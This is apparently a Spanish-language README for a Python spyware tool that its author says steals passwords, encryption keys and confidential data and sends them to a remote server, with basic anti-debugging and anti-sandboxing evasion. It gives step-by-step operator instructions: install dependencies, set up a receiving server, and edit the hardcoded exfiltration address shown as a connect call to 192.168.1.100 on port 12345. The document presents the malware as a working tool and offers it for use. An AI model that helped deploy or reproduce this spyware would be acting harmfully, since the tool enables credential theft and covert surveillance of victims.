Spyware made in python with me, zNetDev

A simple spyware with anti-debugging and anti-sandboxinga

un spyware simple echo por mi

Este código recopila información (como contraseñas, claves de cifrado y datos confidenciales) y te las envía a un servidor remoto. Este código es básico con técnicas básicas para no ser detectado, si buscas algo para tú poder infiltrarte en sitios grandes y recopilar información con este código,busca otro repositorio publico

¿como se usa?

•Primero preparamos el terreno:

Antes que nada, necesitas tener Python instalado en tu computadora. Si no lo tienes, puedes conseguirlo fácilmente desde el sitio web oficial de Python. La instalación es bastante sencilla, solo sigue las instrucciones que te de el sitio oficial

•conseguir las herramientas necesarias

Este código necesita algunas cosas adicionales para funcionar correctamente. Para obtenerlas, abre una ventana de comandos (en Windows, sería el símbolo del sistema) y escribe lo siguiente:

pip install pycriptodome

•preparar tu propio servidor

Antes de ejecutar el código, necesitas configurar un servidor al que el script enviará los datos que recolecte y desde el cual descargar archivos adicionales si es necesario. Tendrás que tener una dirección IP y un número de puerto a mano para hacerlo.

•modificiacion del código 

Abre el archivo de código Python en un editor de texto o un entorno de desarrollo integrado (IDE) como Visual Studio Code o PyCharm. Busca la línea que contiene la dirección IP y el puerto del servidor remoto, esta se encuentra en la línea 104 del código tambien en la 122 (para que no se confundan al respecto) (s.connect(('192.168.1.100', 12345))). Cambia la dirección IP '192.168.1.100' y el puerto 12345 por los de tu servidor remoto

•ejecutar el code

Una vez que hayas hecho las modificaciones q te he dicho, guarda el archivo de código. Abre una terminal o símbolo del sistema y navega hasta el directorio donde se encuentra el archivo de código Python. Ejecuta el script Python con el siguiente comando:

python nombre_del_archivo.py

(cambia el nombre_del_archivo.py con el nombre del archivo que tengas)

tengo pensado hacer este malware modificado en C o en js.
